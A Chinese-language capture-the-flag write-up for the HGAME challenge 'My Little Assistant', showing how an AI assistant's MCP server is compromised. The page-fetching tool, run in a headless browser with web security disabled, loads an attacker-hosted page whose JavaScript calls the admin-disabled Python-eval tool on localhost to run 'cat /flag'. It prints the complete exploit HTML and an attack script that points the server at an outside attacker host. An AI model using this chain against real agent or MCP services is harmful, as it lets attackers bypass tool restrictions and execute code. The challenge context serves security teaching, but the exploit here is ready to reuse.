# My Little Assistant WriteUp

## 题目描述

Woore最近在折腾一个“智能助手”，能分析网页、访问外部资源、执行小工具。
环境：cloud-big.hgame.vidar.club:32343

## 题目分析

拿到题目源码，核心逻辑在 `mcp_server.py` 中。

这是一个基于 FastAPI 的服务，主要逻辑如下：

1.  **定义了工具集**：
    *   **`py_eval(code: str)`**: 使用 `exec()` 执行任意 Python 代码。这是明显的 RCE 点。
    *   **`py_request(url: str)`**: 使用 Playwright (Chromium) 访问指定 URL 并读取页面内容（截取前300字符）。

2.  **Playwright 配置**：
    ```python
    browser = await p.chromium.launch(
        headless=True, 
        args=["--no-sandbox",
              "--disable-dev-shm-usage",
              "--disable-web-security"] # 关键：禁用了同源策略 (SOP)
    )
    ```

3.  **限制**：
    *   直接尝试通过外部 API 调用 `py_eval` 会被拦截（提示“py_eval被管理员禁用了”）。
    *   `py_request` 允许用户控制 URL。

## 漏洞利用逻辑 - SSRF + Local RCE

虽然外部无法直接调用 `py_eval`，但我们可以利用 `py_request` 作为一个 SSRF 的跳板。
由于 Playwright 启动时添加了 `--disable-web-security` 参数，浏览器将不会强制执行同源策略。这意味着我们控制的页面可以通过 JavaScript 跨域访问服务端本地的资源。

**利用链如下：**

1.  **攻击者**构造一个恶意的 HTML 页面托管在公网上。
2.  **攻击者**调用题目的 `py_request` 工具，让服务端的 Playwright 浏览器访问这个恶意页面。
3.  **恶意页面**中的 JavaScript 代码自动执行，使用 `fetch` 向 `http://127.0.0.1:8001/mcp` 发送 POST 请求。
    *   请求目标是本地监听的 MCP 服务。
    *   Payload 是调用 `py_eval` 执行系统命令 `cat /flag`。
4.  **服务端**收到来自本地（127.0.0.1）的请求，并未做鉴权，执行代码并返回 Flag。
5.  **恶意页面**的 JS 接收到 Flag 后，将其写入页面的 DOM 中 (`document.write(...)`)。
6.  **`py_request`** 读取页面内容，将包含 Flag 的 HTML 内容作为结果返回给攻击者。

## Exploit 代码

### 1. 恶意 HTML (`exp.html`)

将其托管在公网服务器上（如 `http://vps/exp.html`）。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit</title>
</head>
<body>
    <script>
        async function runExploit() {
            // 构造 Python Payload 读取 /flag
            const cmd = `
import os
out = {}
try:
    out["flag"] = os.popen("cat /flag").read()
except Exception as e:
    out["error"] = str(e)
del os
`;

            // 构造 MCP 协议请求体
            const payload = {
                "params": {
                    "name": "py_eval",
                    "arguments": {
                        "code": cmd
                    }
                }
            };

            try {
                // 向本地 8001 端口发送请求
                // 由于 --disable-web-security，跨域请求会被允许
                const response = await fetch("http://127.0.0.1:8001/mcp", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                const jsonResp = await response.json();
                
                // 解析返回的 JSON 结构提取执行结果
                try {
                    const textPayload = jsonResp.result.content[0].text;
                    const evalResult = JSON.parse(textPayload);
                    
                    // 将结果覆盖写入页面，确保 py_request 能读取到
                    document.open();
                    document.write("|||RESULT_START|||" + evalResult.result + "|||RESULT_END|||");
                    document.close();
                } catch (parseError) {
                    document.body.innerText = "Parse Error";
                }

            } catch (error) {
                document.body.innerText = "Fetch Error: " + error.toString();
            }
        }

        runExploit();
    </script>
</body>
</html>
```

### 2. 攻击脚本 (`attack.py`)

```python
import requests
import json
import re

# 题目环境 URL
target_url = "http://cloud-big.hgame.vidar.club:32343/execute_tool"
# 你的恶意页面 URL
exploit_url = "https://video.hddpka.cn/exp.html"

headers = {"Content-Type": "application/json"}
data = {
    "name": "py_request",
    "arguments": {
        "url": exploit_url
    }
}

print(f"[*] Triggering SSRF via {exploit_url}...")
response = requests.post(target_url, json=data, headers=headers)
content = response.text

# 提取 Flag
match = re.search(r'hgame\{.*?\}', content)
if match:
    print(f"[+] Flag Found: {match.group(0)}")
else:
    print("[-] RAW Response:", content)
```

## Flag

`hgame{4IMcP_Dr1ven_Xss_aTtAcK_Ch4lN3cc1c38}`
